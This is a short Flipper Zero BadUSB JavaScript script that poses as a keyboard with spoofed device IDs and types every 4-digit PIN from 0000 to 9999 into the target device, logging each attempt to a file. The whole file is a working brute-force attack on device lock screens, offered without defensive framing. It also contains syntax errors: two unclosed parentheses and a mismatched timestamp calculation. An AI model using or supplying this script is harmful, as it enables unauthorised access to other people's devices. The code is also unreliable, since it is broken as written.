let badusb = require("badusb");
let storage = require("storage");
var towrite = []

function convertSeconds(seconds) {
    const hours = Math.floor(seconds / 3600);
    const minutes = Math.floor((seconds % 3600) / 60);
    const remainingSeconds = seconds % 60;

    return `${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}:${String(remainingSeconds).padStart(2, '0')}`;
}

setInterval(() => {storage.write("/ext/4pinoutput.txt", towrite.join("\n");}, 30000)

badusb.setup({ vid: 0xAAAA, pid: 0xBBBB, mfr_name: "Flipper", prod_name: "Zero", layout: "/ext/badusb/assets/layouts/en-US.kl" });

badusb.press("CTRL", "ALT", "c");
delay(500)
badusb.press("SPACE");
badusb.press("CTRL", "ALT", "c");

delay(3000)

for (let i = 0; i < 10000; i++) {
  var h = `[${convertSeconds((i * 500)/100}]: tried code ${String(i).padStart(4, '0')}`
  towrite.push(h)
  console.log(h)
  badusb.println(String(i).padStart(4, '0'), 500);
}


badusb.press("CTRL", "ALT", "c");
delay(500)
badusb.press("SPACE");
badusb.press("CTRL", "ALT", "c");
badusb.quit();
